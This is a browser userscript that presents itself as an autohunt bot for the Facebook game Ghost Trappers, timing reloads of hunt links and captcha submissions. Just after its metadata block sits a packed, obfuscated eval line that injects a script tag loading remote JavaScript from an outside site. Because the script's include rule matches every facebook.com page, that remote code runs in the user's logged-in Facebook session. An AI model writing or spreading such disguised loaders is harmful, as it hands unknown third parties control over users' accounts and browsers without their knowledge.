// ==UserScript==
// @name           Facebook - Ghost Trappers Smart Autohunt Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      iispyderii
// @description    A smart autohunt script for the Ghost Trppers Facebook App
// @include        http://apps.facebook.com/ghost-trappers/*
// @version        1.5.2 Captcha submitting fix
// @version        1.5.1 Hopefully this will fix all submission problems. Thanks xcal
// @version        1.5.0 Added some title bar functionality. 
// @version        1.4.6 Added solution to white page thingy
// @version        1.4.5 Bug fix for early hunt, refresh on white page of death
// @version        1.4.4 Fix in not detecting top timer.
// @version        1.4.2 Fixed so it will work on every page.
// @version        1.4.1 Fixed where it wasn't redirected after entering captcha
// @version        1.4 Fixed the code up to make it more reliable.
// @versions       1.3 Updated code to find and parse out code value. GT switched to a d=XXX value. Hopefully script is now more resilient.
// @versions       1.2 Updated code to find and parse out c value (it's not always 3 numbers, d'oh) 
// @versions       1.1 Added handling for stopping refreshes when a captcha is detected. Changed error writing, misc comments.
// @versions       1.0 Initial Release
// @issues         Does not stop attempting to refresh when you run out of whiskey.
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function nextAvailableTime(zTimeoutvalue)
{
  //Determine the current date, add the timeoutvalue in milliseconds, and
  //return the formatted time.
  d = new Date();

  if(zTimeoutvalue >= 0)
  {
    d.setTime(d.getTime() + zTimeoutvalue);
  }

  minutes = d.getMinutes();
  seconds = d.getSeconds();

  if (minutes < 10)
  {minutes = "0" + minutes;}

  if (seconds < 10)
  {seconds = "0" + seconds;}

  return d.getHours() + ':' + minutes + ':' + seconds;
}



if(document.body.innerHTML.indexOf('captcha_entered_text') != -1)
{   document.title = "Captcha - Submitting in 30 mins"
	setTimeout(function() {document.getElementsByName("captcha_id")[0].parentNode.submit() }, 1800000) //name = "captcha";
	//setTimeout(function() {document.forms.captcha.submit(); }, 1800000);
	
	
	//var forms = document.getElementsByTagName('form');
    //var formid = forms[3].id
    //setTimeout(function() {document.getElementById(formid).submit();}, 1800000);
}
else if (document.body.innerHTML.indexOf('Success! The code has been entered correctly.') != -1)
{
setTimeout(function() {document.location = 'http://apps.facebook.com/ghost-trappers/index.php';}, 3000);
}
else
{ 
    if (document.getElementById('app51157989152_topminutesdiv') != null)
    {
    var minutesid = document.getElementById('app51157989152_topminutesdiv').innerHTML
    var secondsid = document.getElementById('app51157989152_topsecondsdiv').innerHTML
    } 
    else if (document.getElementById('app51157989152_topminutesdiv') == null)
    {
    var minutesid = '0'
    var secondsid = '0'
    } //find where the timer call is made and where the c=XXX value is specified
  linklocation = document.body.innerHTML.search(/hunt.php\?[a-zA-z]+=[0-9]+/);


  if(linklocation != -1)
  {
    //Parse out timer values in minutes and seconds
    //magic number: +8 includes all numbers and right parentheses guaranteed (i hope)
    
    minutes = parseInt(minutesid, 10);
    seconds = parseInt(secondsid, 10);
    //add 3-33 seconds onto refresh timer randomly (i hope)
    timeoutvalue = (minutes * 60 + seconds + Math.round((Math.random() * 5)) + 1) * 1000;
  
    //Parse out c=XXX value
    link = document.body.innerHTML.substring(linklocation + "hunt.php?".length, linklocation + "hunt.php?".length + 15);
    link = link.substring(0,link.indexOf("\"") - 1);    

    //alert(timeoutvalue + "; " + link);
    setTimeout(function() {document.location = 'http://apps.facebook.com/ghost-trappers/hunt.php?' + link;} , timeoutvalue);
    
    document.title = "Next hunt at: " + nextAvailableTime(timeoutvalue);
  }
  else
  {
    document.body.innerHTML = document.body.innerHTML + "<br /><br />Ghost Trappers Smart Autohunt could not parse either the time or the link. Stopping refreshes. <br /><br /><br />";
  setTimeout(function() {document.location = 'http://apps.facebook.com/ghost-trappers/index.php';}, 30000)
  }
}
